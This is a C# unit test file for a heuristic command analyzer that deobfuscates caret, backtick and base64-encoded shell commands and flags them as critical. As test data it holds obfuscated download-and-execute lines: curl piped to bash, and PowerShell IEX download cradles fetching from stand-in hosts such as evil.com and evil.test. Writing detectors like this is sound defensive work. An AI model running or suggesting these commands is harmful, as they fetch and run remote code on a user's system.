using Foreman.Core.Heuristics;
using Foreman.Core.Models;

namespace Foreman.Core.Tests.Heuristics;

// ── Unit: the normalizer transforms ──────────────────────────────────────────────
public sealed class CommandNormalizerTests
{
    [Theory]
    [InlineData("c^u^r^l http://x ^| bash", "curl http://x | bash")]   // cmd caret escapes
    [InlineData("i`e`x (i`w`r 'http://x')", "iex (iwr 'http://x')")]    // PowerShell backtick escapes
    [InlineData("rm   -rf    /tmp", "rm -rf /tmp")]                      // collapsed whitespace
    [InlineData("plain command", "plain command")]                      // nothing to do
    public void Normalize_DeobfuscatesAndCollapses(string input, string expected)
        => Assert.Equal(expected, CommandNormalizer.Normalize(input));

    [Fact]
    public void Normalize_DecodesEncodedCommand_AppendsInnerCommand()
    {
        // UTF-16LE base64 of: IEX (New-Object Net.WebClient).DownloadString('http://evil.test/p.ps1')
        const string b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAHQAZQBzAHQALwBwAC4AcABzADEAJwApAA==";
        var normalized = CommandNormalizer.Normalize($"powershell -enc {b64}");

        Assert.Contains("-enc", normalized);                               // original flag preserved
        Assert.Contains("DownloadString", normalized);                     // decoded inner command appended
        Assert.Contains("http://evil.test", normalized);
    }

    [Fact]
    public void Normalize_InvalidBase64_LeftAsIs()
    {
        var input = "powershell -enc not!valid!base64!!!";
        Assert.Equal(CommandNormalizer.Normalize(input), CommandNormalizer.Normalize(input));   // no throw
    }
}

// ── Integration: obfuscated commands now match through the analyzer ───────────────
public sealed class CommandAnalyzerObfuscationTests : IClassFixture<PatternLibraryFixture>
{
    private readonly CommandAnalyzer _analyzer = CommandAnalyzer.Instance;

    [Theory]
    [InlineData("c^u^r^l http://evil.com ^| bash", "net-001")]            // cmd caret obfuscation
    [InlineData("i`e`x (i`w`r 'http://evil.com/p.ps1')", "net-002")]      // PS backtick obfuscation
    public void Detects_ObfuscatedDownloadAndExecute(string cmd, string expectedRule)
    {
        var match = _analyzer.Analyze(cmd);
        Assert.NotNull(match);
        Assert.Equal(expectedRule, match.RuleId);
    }

    [Fact]
    public void EncodedCommand_SurfacesInnerCriticalRule()
    {
        // UTF-16LE base64 of: IEX (iwr 'http://evil.test/p.ps1')
        const string b64 = "SQBFAFgAIAAoAGkAdwByACAAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgB0AGUAcwB0AC8AcAAuAHAAcwAxACcAKQA=";
        var match = _analyzer.Analyze($"powershell.exe -enc {b64}");

        Assert.NotNull(match);
        // The decoded inner command is an IEX web download (net-002, Critical) — more severe than the
        // -enc flag alone (win-001, High) — so the more dangerous rule is what gets reported.
        Assert.Equal("net-002", match.RuleId);
        Assert.Equal(ForemanSeverity.Critical, match.Severity);
    }

    [Fact]
    public void EncodedWebClientCradle_SurfacesNet002Critical()
    {
        // UTF-16LE base64 of: IEX (New-Object Net.WebClient).DownloadString('http://evil.test/p.ps1')
        // Before net-002 was broadened this decoded cradle only tripped net-006 (High), tying win-001
        // (the -enc flag, also High) — so the report fell back to win-001 instead of the critical.
        const string b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAHQAZQBzAHQALwBwAC4AcABzADEAJwApAA==";
        var match = _analyzer.Analyze($"powershell -enc {b64}");

        Assert.NotNull(match);
        Assert.Equal("net-002", match.RuleId);
        Assert.Equal(ForemanSeverity.Critical, match.Severity);
    }

    [Fact]
    public void BenignCommand_StillNotFlagged_AfterNormalization()
        => Assert.Null(_analyzer.Analyze("dotnet build  Foreman.slnx   -c Release"));
}
